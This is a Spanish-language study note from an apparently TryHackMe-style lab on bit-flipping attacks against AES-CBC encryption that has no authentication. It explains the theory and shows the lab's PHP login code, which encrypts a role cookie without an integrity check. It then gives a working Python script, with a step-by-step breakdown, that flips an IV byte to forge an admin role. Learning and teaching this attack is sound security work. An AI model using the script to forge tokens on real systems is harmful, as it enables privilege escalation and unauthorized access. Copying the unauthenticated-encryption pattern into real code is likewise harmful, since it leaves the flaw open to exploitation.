---
layout: apunte
title: "4. Bit Flipping Attacks"
---

<h2>¿Qué es la Encriptación no Autentificada?</h2>
La encriptación no autentificada se refiere a la encriptación que no incluye un mecanismo para verificar la integridad o autenticidad del ciphertext. Esto significa que el atacante puede modificar la información encriptada que está en tránsito y el sistema la seguirá aceptando y procesando sin detectar ninguna manipulación.

Cuando la aplicación desencripta ciphertext alterado sin verificar su integridad, un atacante puede manipularlo de formas predecibles. Esta es la causa de raíz de los ataques bit-flipping (cambio de bit).

Un clásico ejemplo es AES en modo CBC (Cipher Block Chaining) sin tag de autentificación. AES-CBC encripta la información de manera segura pero no asegura la integridad. Si un atacante puede modificar el ciphertext, puede manipular ciertos bits de información desencriptada sin romper la encriptación.

Esto lleva a los ataques bit-flipping, donde el atacante modifica el ciphertext de tal manera que resulta en modificaciones controladas del plaintext.

--------------------------------------------
<h2>Ataques Bit-Flipping</h2>
Los ataques bit-flipping apuntan a sistemas que usan encriptación no autentificada, permitiendo a un atacante modificar el ciphertext para que el texto plano desencriptado sea manipulado en formas predecibles. Este tipo de ataque es particularmente peligroso cuando los sistemas asumen que la información encriptada es inherentemente segura sin verificar su integridad.

Los esquemas de encriptación como AES-CBC (Cipher Block Chaining) son vulnerables a bit flipping cuando no hay comprobación de integridad, como MAC. En el modo CBC:

1. El plaintext es aplicado XOR con el bloque ciphertext previo antes de la encriptación.
2. Si un atacante altera bits en el bloque ciphertext, cambia el bloque plaintext correspondiente durante la desencriptación.

Por ejemplo, considera un payload encriptado:

```json
{"role":"0"}
```

Si este ciphertext es manipulado, el rol podría ser escalado a `"1"`. Sin protección de integridad, el sistema aceptaría el plaintext manipulado como legítimo.

---------------------------------------
<h2>Ejercicio</h2>
Navega a http://bcts.thm/labs/lab4/.

!**Pasted image 20260312114445.png|514**

La aplicación acepta cualquier credencial como se muestra abajo:

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username'], $_POST['password'])) {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    $message = "username={$username}";
    $role = "0";
    $token = encrypt_data($message, $key, $iv);
    $token2 = encrypt_data($role, $key, $iv);

    setcookie("auth_token", $token, time() + 3600, "/");
    setcookie("role", $token2, time() + 3600, "/");
    header("Location: dashboard.php");
    exit();
}
```

Como podemos ver, la cookie llamada `role` usa una versión encriptada del texto "0".

!**Pasted image 20260312114650.png**

Debajo un script de ejemplo que cambia `role=0` por `role=1`.

```python
import base64, sys
from binascii import unhexlify, hexlify

original_token = sys.argv[1] # Your encrypted role token goes here

try:
    cipher_bytes = bytearray(unhexlify(original_token))
except ValueError:
    print("Invalid token format! Make sure it's a valid hex string.")
    exit(1)

# AES block size
block_size = 16

# Debug: Print IV (first 16 bytes) before modification
print("\n[DEBUG] Original IV (First 16 Bytes):", hexlify(cipher_bytes[:block_size]).decode())

guest_offset = 0

xor_diff = [
    0x01,  # '0' -> '1'
]

# Apply bit flipping to the IV (first 16 bytes)
for i, diff in enumerate(xor_diff):
    print(f"[DEBUG] Modifying byte at offset {guest_offset + i}: {hex(cipher_bytes[guest_offset + i])} XOR {hex(diff)}")
    cipher_bytes[guest_offset + i] ^= diff

print("\n[DEBUG] Modified IV (First 16 Bytes):", hexlify(cipher_bytes[:block_size]).decode())

# Encode the modified token back to hex
modified_token = hexlify(cipher_bytes).decode()

print("\nModified Token:")
print(modified_token)
print("\nUse this token as the new 'role' cookie in your browser to log in as admin.")
```

<h3>Desglose</h3>
**original_token:**

```python
original_token = "" # Put your encrypted role token here
```

- Esto debería contener el rol token encriptado con AES.

**Decodificación Hex:** 

```python
try:
    cipher_bytes = bytearray(unhexlify(original_token))
except ValueError:
    print("Invalid token format! Make sure it's a valid hex string.")
    exit(1)
```

- Convierte el token hex encoded en un byte array para su modificación.
- Si el token no está en un formato hex válido, se imprime un error y el script para.

**Tamaño de Bloque AES y Vector de Inicialización (IV):**

```python
block_size = 16
```

- AES usa un tamaño de bloque de 16 bytes.
- Los primeros 16 bytes del token encriptado representan el IV en modo AES-CBC.

**Debugging: Imprimir el IV Original:** 

```python
print("\n[DEBUG] Original IV (First 16 Bytes):", hexlify(cipher_bytes[:block_size]).decode())
```

- El script imprime el IV antes de la modificación para rastrear los cambios.

**Ataque de Bit-Flipping:** 

```python
guest_offset = 0

xor_diff = [
    0x01,  # '0' -> '1'
]
```

- Bit-flipping funciona modificando el IV para cambiar el texto plano desencriptado.
- `guest_offset=0` significa que la modificación empieza en el byte 0 del IV.
- El script aplica la operación XOR (`^=`) para cambiar un byte específico en el IV.
	- En este caso cambia "0" a "1" en el texto desencriptado.

**Aplicar el Bit Flip:** 

```python
for i, diff in enumerate(xor_diff):
    print(f"[DEBUG] Modifying byte at offset {guest_offset + i}: {hex(cipher_bytes[guest_offset + i])} XOR {hex(diff)}")
    cipher_bytes[guest_offset + i] ^= diff
```

- Itera sobre `xor_diff` y modifica los bytes correspondientes en el IV.
- Usa XOR para modificar el primer byte del IV.

**Debugging: Imprime el IV Modificado:** 

```python
print("\n[DEBUG] Modified IV (First 16 Bytes):", hexlify(cipher_bytes[:block_size]).decode())
```

- Imprime el nuevo IV después de la modificación.

**Encoding:** 

```python
modified_token = hexlify(cipher_bytes).decode()

print("\nModified Token:")
print(modified_token)
print("\nUse this token as the new 'role' cookie in your browser to log in as admin.")
```

- Convierte el token modificado de vuelta a una string hex-encoded.

Ejecuta el script.

!**Pasted image 20260312124120.png**

Usando la cookie modificada accede a la flag de la página.

!**Pasted image 20260312124136.png**

